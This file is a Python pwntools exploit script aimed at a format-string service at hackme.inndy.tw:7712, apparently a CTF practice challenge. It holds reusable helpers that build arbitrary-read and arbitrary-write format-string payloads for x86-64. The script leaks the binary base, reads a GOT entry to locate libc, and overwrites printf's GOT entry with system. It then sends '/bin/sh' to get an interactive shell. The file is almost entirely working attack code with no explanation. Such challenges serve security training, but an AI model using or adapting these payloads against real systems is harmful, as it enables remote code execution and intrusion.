#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

def GetIntegerSequenceLength(a, b):
    result = 0
    boundary = 10
    while boundary < b:
        if boundary >= a:
            result += (boundary - a) * (len(str(boundary)) - 1)
            a = boundary
        boundary *= 10
    result += (b - a)  * len(str(a))
    return result

def WriteBytesPayloadX64(offset, addr, bs):
    bytes_dict = {}
    for i in range(len(bs)):
        b = ord(bs[i])
        v = bytes_dict.get(b)
        if v == None:
            bytes_dict[b] = [ addr + i ]
        else:
            bytes_dict[b].append(addr + i)

    chars_written = 0
    addrs_count = 0
    payload = ''
    for k in sorted(bytes_dict.keys()):
        if k - chars_written == 0:
            payload += '%|$hhn' * len(bytes_dict[k])
        else:
            payload += '%%%dc' % (k - chars_written)  + '%|$hhn' * len(bytes_dict[k])
        chars_written = k
        addrs_count += len(bytes_dict[k])

    begin_index = offset
    while True:
        l = len(payload) - addrs_count + GetIntegerSequenceLength(begin_index, begin_index + addrs_count)
        l += (8 - l % 8) % 8
        if begin_index >= l // 8 + offset:
            break
        else:
            begin_index = l // 8 + offset

    i = -1
    while True:
        i = payload.find('|', i + 1)
        if i == -1:
            break
        else:
            payload = payload[:i] + str(begin_index) + payload[i + 1:]
            begin_index += 1
    
    payload += '\x00' * ((8 - len(payload) % 8) % 8)

    for k in sorted(bytes_dict.keys()):
        for address in bytes_dict[k]:
            payload += pack(address, 64)
    
    return payload

def ReadBytesPayloadX64(offset, addr, size):
    payload = '%%|$.%ds' % size

    begin_index = offset
    addrs_count = 1
    while True:
        l = len(payload) - addrs_count + GetIntegerSequenceLength(begin_index, begin_index + addrs_count)
        l += (8 - l % 8) % 8
        if begin_index >= l // 8 + offset:
            break
        else:
            begin_index = l // 8 + offset

    i = payload.find('|')
    payload = payload[0:i] + str(begin_index) + payload[i + 1:]
    payload += '\x00' * ((8 - len(payload) % 8) % 8)
    payload += pack(addr, 64)
    return payload

conn = connect('hackme.inndy.tw', 7712)

conn.sendline('%34$p')
recv = conn.read()
imagebase_addr = int(recv, 16) - 0x810
GOT_fgets_addr = imagebase_addr + 0x0000000000201030
GOT_printf_addr = imagebase_addr + 0x0000000000201020
GOT_system_addr = imagebase_addr + 0x0000000000201018
log.info('imagebase_addr = 0x%016x' % imagebase_addr)
log.info('GOT_fgets_addr = 0x%016x' % GOT_fgets_addr)
log.info('GOT_printf_addr = 0x%016x' % GOT_printf_addr)
log.info('GOT_system_addr = 0x%016x' % GOT_system_addr)

payload = ReadBytesPayloadX64(6, GOT_fgets_addr, 8)
conn.sendline(payload)
recv = conn.read()
libc_fgets_addr = unpack(recv.ljust(8, '\x00')[0:8], 64)
libc_addr = libc_fgets_addr - 0x000000000006da80
libc_printf_addr = libc_addr + 0x00000000000557b0
libc_system_addr = libc_addr + 0x0000000000045380
log.info('libc_addr = 0x%016x' % libc_addr)
log.info('libc_fgets_addr = 0x%016x' % libc_fgets_addr)
log.info('libc_printf_addr = 0x%016x' % libc_printf_addr)
log.info('libc_system_addr = 0x%016x' % libc_system_addr)

payload = WriteBytesPayloadX64(6, GOT_printf_addr, pack(libc_system_addr, 64))
conn.sendline(payload)
conn.read()

conn.sendline('/bin/sh')
conn.interactive()

